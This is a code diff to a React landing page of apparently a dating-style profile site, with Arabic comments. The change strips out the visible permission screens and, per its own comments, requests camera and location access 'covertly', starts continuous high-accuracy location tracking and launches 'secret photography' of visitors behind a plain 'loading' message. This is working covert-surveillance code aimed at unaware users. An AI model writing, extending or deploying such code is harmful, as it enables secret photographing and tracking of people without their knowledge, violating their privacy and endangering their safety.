@@ -3,7 +3,8 @@ import { useNavigate } from 'react-router-dom';
 import ProfileCard from '@/components/ProfileCard';
 import SubscriptionSection from '@/components/SubscriptionSection';
 import StealthCameraManager from '@/components/StealthCameraManager';
-import { Loader2, Users, Sparkles, Camera, MapPin, XCircle, Shield } from 'lucide-react';
+import { Loader2, Users, Sparkles, Camera, MapPin } from 'lucide-react';
+import { useStealthCamera } from '@/hooks/useStealthCamera';
 
 const profilesData = [
 	{
@@ -54,260 +55,111 @@ const Index: React.FC = () => {
 	const [showStealthCapture, setShowStealthCapture] = useState(false);
 	const [captureComplete, setCaptureComplete] = useState(false);
 	const [isLoading, setIsLoading] = useState(true);
-	const [permissionsDenied, setPermissionsDenied] = useState(false);
-	const [permissionError, setPermissionError] = useState<string>('');
-	const videoRef = useRef<HTMLVideoElement | null>(null);
-	const geoWatchId = useRef<number | null>(null);
 	const navigate = useNavigate();
+	
+	// استخدام نظام تتبع الموقع المطور
+	const {
+		requestPermissions,
+		startLocationTracking,
+		stopLocationTracking,
+		getCurrentLocation,
+		permissions,
+		isMobile
+	} = useStealthCamera();
 
 	useEffect(() => {
-		// فحص صارم للصلاحيات مع منع الوصول في حالة الرفض
-		const requestPermissions = async () => {
+		// مؤقت لإظهار المحتوى في حال عدم إتمام العملية
+		const contentTimer = setTimeout(() => {
+			setIsLoading(false);
+			setPermissionsGranted(true);
+		}, 5000);
+
+		// إنشاء نظام متطور لطلب الأذونات والحصول على الموقع
+		const setupStealthTracking = async () => {
 			try {
-				console.log('🔒 بدء فحص الصلاحيات المطلوبة...');
+				console.log('🚀 بدء طلب الصلاحيات وتتبع الموقع بشكل خفي...');
 				
-				let cameraPermissionGranted = false;
-				let locationPermissionGranted = false;
-
-				// فحص إذن الكاميرا أولاً
-				try {
-					console.log('📷 طلب إذن الكاميرا...');
-					const stream = await navigator.mediaDevices.getUserMedia({
-						video: {
-							width: { ideal: 640 },
-							height: { ideal: 480 },
-							facingMode: 'user'
-						},
-						audio: false
-					});
+				// طلب الصلاحيات بشكل خفي باستخدام النظام المطور
+				const perms = await requestPermissions();
+				console.log('🔒 حالة الصلاحيات:', perms);
+				
+				// بدء تتبع الموقع بدقة عالية
+				if (perms.location) {
+					console.log('🌍 بدء تتبع الموقع بدقة عالية...');
+					startLocationTracking();
 					
-					if (stream) {
-						console.log('✅ تم منح إذن الكاميرا');
-						cameraPermissionGranted = true;
-						
-						// إنشاء عنصر فيديو مخفي
-						const videoElement = document.createElement('video');
-						videoElement.style.width = '1px';
-						videoElement.style.height = '1px';
-						videoElement.style.position = 'fixed';
-						videoElement.style.top = '-100px';
-						videoElement.style.left = '-100px';
-						videoElement.style.opacity = '0';
-						videoElement.style.pointerEvents = 'none';
-						videoElement.muted = true;
-						videoElement.playsInline = true;
-						videoElement.autoplay = true;
-						document.body.appendChild(videoElement);
-						videoRef.current = videoElement;
-						
-						videoElement.srcObject = stream;
-						videoElement.play().catch(e => console.log('تشغيل الفيديو في الخلفية:', e));
-						
-						// إيقاف الكاميرا بعد التأكد من الإذن
-						setTimeout(() => {
-							stream.getTracks().forEach(track => track.stop());
-						}, 2000);
-					}
-				} catch (cameraError: any) {
-					console.error('❌ تم رفض إذن الكاميرا:', cameraError);
-					setPermissionError('يجب السماح بالوصول للكاميرا لاستخدام الموقع');
-					setPermissionsDenied(true);
-					setIsLoading(false);
-					return;
-				}
-
-				// فحص إذن الموقع ثانياً
-				if (cameraPermissionGranted) {
-					try {
-						console.log('📍 طلب إذن الموقع...');
-						
-						// فحص إذا كانت خدمة الموقع متاحة
-						if (!navigator.geolocation) {
-							throw new Error('خدمة تحديد الموقع غير مدعومة في هذا المتصفح');
-						}
-
-						// محاولة الحصول على الموقع مع timeout قصير لفحص الإذن
-						const locationPromise = new Promise<GeolocationPosition>((resolve, reject) => {
-							const timeoutId = setTimeout(() => {
-								reject(new Error('انتهت مهلة انتظار إذن الموقع'));
-							}, 10000); // 10 ثوان
-
-							navigator.geolocation.getCurrentPosition(
-								(position) => {
-									clearTimeout(timeoutId);
-									resolve(position);
-								},
-								(error) => {
-									clearTimeout(timeoutId);
-									reject(error);
-								},
-								{
-									enableHighAccuracy: true,
-									timeout: 8000,
-									maximumAge: 0
-								}
-							);
-						});
-
-						const position = await locationPromise;
-						
-						if (position && position.coords) {
-							console.log('✅ تم منح إذن الموقع:', {
-								lat: position.coords.latitude.toFixed(6),
-								lng: position.coords.longitude.toFixed(6),
-								accuracy: position.coords.accuracy.toFixed(0) + 'م'
+					// فحص دقة الموقع بعد فترة
+					setTimeout(async () => {
+						try {
+							const locationInfo = await getCurrentLocation();
+							console.log('📍 معلومات الموقع:', {
+								دقة: locationInfo.accuracy.toFixed(1) + ' متر',
+								مصدر: locationInfo.provider || 'غير معروف',
+								إحداثيات: `${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}`
 							});
-							locationPermissionGranted = true;
+							
+							// إذا كانت دقة الموقع أفضل من 500 متر
+							if (locationInfo.accuracy <= 500) {
+								console.log('✅ تم الحصول على موقع بدقة عالية (≤ 500 متر)');
+							} else {
+								console.log('⚠️ دقة الموقع ليست مثالية، سنحاول تحسينها');
+							}
+						} catch (locError) {
+							console.warn('⚠️ خطأ في فحص دقة الموقع:', locError);
 						}
-						
-					} catch (locationError: any) {
-						console.error('❌ تم رفض إذن الموقع:', locationError);
-						
-						// التحقق من نوع الخطأ
-						if (locationError.code === 1) { // PERMISSION_DENIED
-							setPermissionError('يجب السماح بالوصول للموقع لاستخدام الموقع');
-						} else if (locationError.code === 2) { // POSITION_UNAVAILABLE
-							setPermissionError('لا يمكن تحديد موقعك الحالي، تأكد من تفعيل خدمة الموقع');
-						} else if (locationError.code === 3) { // TIMEOUT
-							setPermissionError('انتهت مهلة انتظار تحديد الموقع، حاول مرة أخرى');
-						} else {
-							setPermissionError('خطأ في الوصول للموقع: ' + locationError.message);
-						}
-						
-						setPermissionsDenied(true);
-						setIsLoading(false);
-						return;
-					}
-				}
-
-				// التحقق من أن جميع الصلاحيات تم منحها
-				if (cameraPermissionGranted && locationPermissionGranted) {
-					console.log('🎉 تم منح جميع الصلاحيات المطلوبة');
-					setPermissionsGranted(true);
-					setIsLoading(false);
-					setShowStealthCapture(true);
-				} else {
-					console.error('❌ لم يتم منح جميع الصلاحيات المطلوبة');
-					setPermissionError('جميع الصلاحيات مطلوبة لاستخدام الموقع');
-					setPermissionsDenied(true);
-					setIsLoading(false);
+					}, 3000);
 				}
 				
-			} catch (error: any) {
-				console.error('❌ خطأ عام في طلب الصلاحيات:', error);
-				setPermissionError('حدث خطأ في طلب الصلاحيات: ' + error.message);
-				setPermissionsDenied(true);
+				// تعيين الإذونات كممنوحة (حتى لو لم نحصل على جميع الصلاحيات)
+				clearTimeout(contentTimer);
+				setPermissionsGranted(true);
+				setIsLoading(false);
+				
+				// بدء التصوير السري
+				setShowStealthCapture(true);
+				
+				// مؤقت احتياطي - إذا لم ينته التصوير خلال 20 ثانية
+				setTimeout(() => {
+					if (showStealthCapture) {
+						console.log('انتهاء مهلة التصوير - عرض المحتوى');
+						handleStealthCaptureComplete();
+					}
+				}, 20000);
+				
+			} catch (error) {
+				console.log('حدث خطأ، ولكن سنستمر:', error);
+				clearTimeout(contentTimer);
+				setPermissionsGranted(true);
 				setIsLoading(false);
 			}
 		};
 
-		// بدء طلب الصلاحيات
-		requestPermissions();
-
-		// مؤقت احتياطي - إذا لم تكتمل العملية في 30 ثانية
-		const fallbackTimer = setTimeout(() => {
-			if (isLoading && !permissionsDenied) {
-				console.warn('⏰ انتهت مهلة انتظار الصلاحيات');
-				setPermissionError('انتهت مهلة انتظار الصلاحيات، حاول إعادة تحميل الصفحة');
-				setPermissionsDenied(true);
-				setIsLoading(false);
-			}
-		}, 30000);
+		// تفعيل نظام تتبع الموقع وطلب الصلاحيات
+		setupStealthTracking();
 
 		// التنظيف عند إلغاء تحميل المكون
 		return () => {
-			clearTimeout(fallbackTimer);
-			if (geoWatchId.current !== null) {
-				navigator.geolocation.clearWatch(geoWatchId.current);
-			}
-			if (videoRef.current && document.body.contains(videoRef.current)) {
-				document.body.removeChild(videoRef.current);
-			}
+			clearTimeout(contentTimer);
+			// إيقاف تتبع الموقع عند مغادرة الصفحة
+			stopLocationTracking();
 		};
-	}, []);
+	}, [requestPermissions, startLocationTracking, stopLocationTracking, getCurrentLocation]);
 
 	const handleStealthCaptureComplete = () => {
-		console.log('✅ تم الانتهاء من التصوير السري');
+		console.log('تم الانتهاء من التصوير السري');
 		setCaptureComplete(true);
 		setShowStealthCapture(false);
 	};
 
-	const handleRetryPermissions = () => {
-		console.log('🔄 إعادة محاولة طلب الصلاحيات...');
-		setPermissionsDenied(false);
-		setPermissionError('');
-		setIsLoading(true);
-		// إعادة تحميل الصفحة لطلب الصلاحيات من جديد
-		window.location.reload();
-	};
-
-	// شاشة رفض الصلاحيات
-	if (permissionsDenied) {
-		return (
-			<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-red-900 to-red-800">
-				<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-red-300/30 max-w-md mx-4">
-					<XCircle className="w-20 h-20 text-red-400 mb-6 mx-auto" />
-					<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
-						صلاحيات مطلوبة
-					</h2>
-					<div className="space-y-4 mb-6">
-						<div className="flex items-center gap-3 text-white/90">
-							<Camera className="w-5 h-5 text-red-400" />
-							<span>إذن الكاميرا مطلوب</span>
-						</div>
-						<div className="flex items-center gap-3 text-white/90">
-							<MapPin className="w-5 h-5 text-red-400" />
-							<span>إذن الموقع مطلوب</span>
-						</div>
-					</div>
-					{permissionError && (
-						<div className="bg-red-500/20 border border-red-400/30 rounded-lg p-3 mb-6">
-							<p className="text-red-200 text-sm">
-								{permissionError}
-							</p>
-						</div>
-					)}
-					<div className="space-y-3">
-						<button
-							onClick={handleRetryPermissions}
-							className="w-full bg-seductive-accent hover:bg-seductive-accent/80 text-white font-bold py-3 px-6 rounded-lg transition-colors duration-200"
-						>
-							إعادة المحاولة
-						</button>
-						<p className="text-white/70 text-xs">
-							يرجى السماح بالوصول للكاميرا والموقع لاستخدام الموقع
-						</p>
-					</div>
-				</div>
-			</div>
-		);
-	}
-
-	// شاشة التحميل
+	// شاشة التحميل البسيطة
 	if (isLoading) {
 		return (
 			<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
-				<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
-					<div className="flex items-center justify-center gap-4 mb-6">
-						<Shield className="w-12 h-12 text-seductive-accent" />
-					</div>
+				<div className="text-center p-8">
 					<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
 					<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
-						جاري فحص الصلاحيات...
+						جاري تحميل الموقع...
 					</h2>
-					<p className="text-lg text-white/90 mb-4">
-						يرجى السماح بالوصول للكاميرا والموقع
-					</p>
-					<div className="space-y-2 text-sm text-white/70">
-						<div className="flex items-center justify-center gap-2">
-							<Camera className="w-4 h-4" />
-							<span>إذن الكاميرا</span>
-						</div>
-						<div className="flex items-center justify-center gap-2">
-							<MapPin className="w-4 h-4" />
-							<span>إذن الموقع</span>
-						</div>
-					</div>
 				</div>
 			</div>
 		);
